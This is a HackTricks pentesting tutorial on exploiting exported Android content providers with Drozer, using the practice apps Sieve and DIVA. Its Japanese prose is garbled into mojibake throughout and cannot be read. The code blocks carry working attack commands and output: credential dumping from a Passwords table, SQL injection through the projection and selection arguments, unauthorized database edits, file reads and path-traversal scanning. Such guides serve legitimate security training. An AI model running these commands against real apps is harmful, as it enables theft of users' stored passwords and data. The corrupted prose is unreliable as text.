# Exploiting Content Providers

## Exploiting Content Providers

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Intro

ãƒ‡ãƒ¼ã‚¿ã¯ã€**ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã‚ˆã£ã¦ã€ä»–ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**è¦æ±‚ã«å¿œã˜ã¦æä¾›ã•ã‚Œã¾ã™**ã€‚ã“ã‚Œã‚‰ã®è¦æ±‚ã¯ã€**ContentResolverã‚¯ãƒ©ã‚¹**ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’é€šã˜ã¦ç®¡ç†ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã€**ãƒ•ã‚¡ã‚¤ãƒ«**ã€ã¾ãŸã¯**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**ãªã©ã€ã•ã¾ã–ã¾ãªå ´æ‰€ã«ãƒ‡ãƒ¼ã‚¿ã‚’ä¿å­˜ã§ãã¾ã™ã€‚

_Manifest.xml_ãƒ•ã‚¡ã‚¤ãƒ«ã§ã¯ã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã®å®£è¨€ãŒå¿…è¦ã§ã™ã€‚ä¾‹ãˆã°ï¼š
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€`READ_KEYS`æ¨©é™ãŒå¿…è¦ã§ã™ã€‚èˆˆå‘³æ·±ã„ã“ã¨ã«ã€é–‹ç™ºè€…ã®ãƒŸã‚¹ã«ã‚ˆã‚Šä¿è­·ã•ã‚Œã¦ã„ãªã„ä»¥ä¸‹ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§`/Keys/`ãƒ‘ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚é–‹ç™ºè€…ã¯`/Keys`ã‚’ä¿è­·ã—ã¾ã—ãŸãŒã€`/Keys/`ã‚’å®£è¨€ã—ã¾ã—ãŸã€‚

**ãŠãã‚‰ãã€ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€ã„ãã¤ã‹ã®è„†å¼±æ€§ï¼ˆSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚„ãƒ‘ã‚¹ãƒ»ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼‰ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**

## **éœ²å‡ºã—ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**ã«åˆ°é”ã™ã‚‹æ–¹æ³•ã‚’ã€URIã‚’ã€Œ_content://_ã€ã§å§‹ã‚ã‚‹ã“ã¨ã§çµ„ã¿ç«‹ã¦ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€Drozerã‚’ä½¿ç”¨ã—ã¦å¾—ã‚‰ã‚ŒãŸæ´å¯Ÿã«åŸºã¥ã„ã¦ãŠã‚Šã€é‡è¦ãªæƒ…å ±ã¯_/Keys_ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚Šã¾ã—ãŸã€‚

Drozerã¯**ã„ãã¤ã‹ã®URIã‚’æ¨æ¸¬ã—ã¦è©¦ã™ã“ã¨ãŒã§ãã¾ã™**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
ã‚ãªãŸã¯ã¾ãŸã€**ContentProviderã‚³ãƒ¼ãƒ‰**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã‚¯ã‚¨ãƒªã‚’æ¢ã™ã¹ãã§ã™ï¼š

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

ã¾ãŸã€å®Œå…¨ãªã‚¯ã‚¨ãƒªãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€`onCreate`ãƒ¡ã‚½ãƒƒãƒ‰ã§**ContentProviderã«ã‚ˆã£ã¦å®£è¨€ã•ã‚ŒãŸåå‰**ã‚’**ç¢ºèª**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

![](<../../../.gitbook/assets/image (564).png>)

ã‚¯ã‚¨ãƒªã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`content://name.of.package.class/declared_name`

## **ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒãƒƒã‚¯ã®Content Providers**

ãŠãã‚‰ãã»ã¨ã‚“ã©ã®Content Providersã¯**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã®**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚Œã°ã€æƒ…å ±ã‚’**æŠ½å‡ºã€æ›´æ–°ã€æŒ¿å…¥ã€å‰Šé™¤**ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
**æ©Ÿå¯†æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹**ç¢ºèªã™ã‚‹ã‹ã€**èªè¨¼**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’**å›é¿**ã™ã‚‹ãŸã‚ã«ãã‚Œã‚’å¤‰æ›´ã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ã€‚

Content Providerã®ã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹éš›ã«ã¯ã€_queryã€insertã€updateã€delete_ã®ã‚ˆã†ãªåå‰ã®**é–¢æ•°**ã‚‚**æ¢ã—ã¦ãã ã•ã„**ï¼š

![](<../../../.gitbook/assets/image (887).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

ãªãœãªã‚‰ã€ã‚ãªãŸã¯ãã‚Œã‚‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

### ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Insert content

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹ã“ã¨ã§ã€**ã‚«ãƒ©ãƒ ã®åå‰**ã‚’å­¦ã³ã€ãã®å¾Œã€DBã«ãƒ‡ãƒ¼ã‚¿ã‚’æŒ¿å…¥ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š

![](<../../../.gitbook/assets/image (98).png>)

![](<../../../.gitbook/assets/image (173).png>)

_æŒ¿å…¥ã¨æ›´æ–°ã§ã¯ã€--stringã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’ç¤ºã—ã€--doubleã‚’ä½¿ç”¨ã—ã¦å€ç²¾åº¦ã‚’ç¤ºã—ã€--floatã€--integerã€--longã€--shortã€--booleanã‚’ä½¿ç”¨ã§ãã¾ã™_

### Update content

ã‚«ãƒ©ãƒ ã®åå‰ã‚’çŸ¥ã‚‹ã“ã¨ã§ã€**ã‚¨ãƒ³ãƒˆãƒªã‚’ä¿®æ­£**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

![](<../../../.gitbook/assets/image (780).png>)

### Delete content

![](<../../../.gitbook/assets/image (423).png>)

### **SQL Injection**

**(SQLite)** ã«å¯¾ã™ã‚‹SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã®ã¯ç°¡å˜ã§ã€**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã¨**é¸æŠãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰**ã‚’æ“ä½œã™ã‚‹ã“ã¨ã§ã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«æ¸¡ã•ã‚Œã¾ã™ã€‚\
ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹éš›ã«ã€æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã®2ã¤ã®èˆˆå‘³æ·±ã„å¼•æ•°ãŒã‚ã‚Šã¾ã™ï¼š_--selection_ ã¨ _--projection_ï¼š

![](<../../../.gitbook/assets/image (784).png>)

ã“ã®**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã‚’**æ‚ªç”¨**ã—ã¦**SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozerã«ã‚ˆã‚‹è‡ªå‹•SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ç™ºè¦‹**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒãƒƒã‚¯ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¯**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ï¼š**

![](<../../../.gitbook/assets/image (407).png>)

### ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€

ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **ãƒ‘ã‚¹ãƒ»ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«**

ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã¯ã€ãƒ‘ã‚¹ãƒ»ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã“ã®å ´åˆã€ã“ã‚Œã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ãŒã€ã€Œ_../_ã€ã‚„é¡ä¼¼ã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozerã«ã‚ˆã‚‹è‡ªå‹•ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ç™ºè¦‹**
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## å‚è€ƒæ–‡çŒ®

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
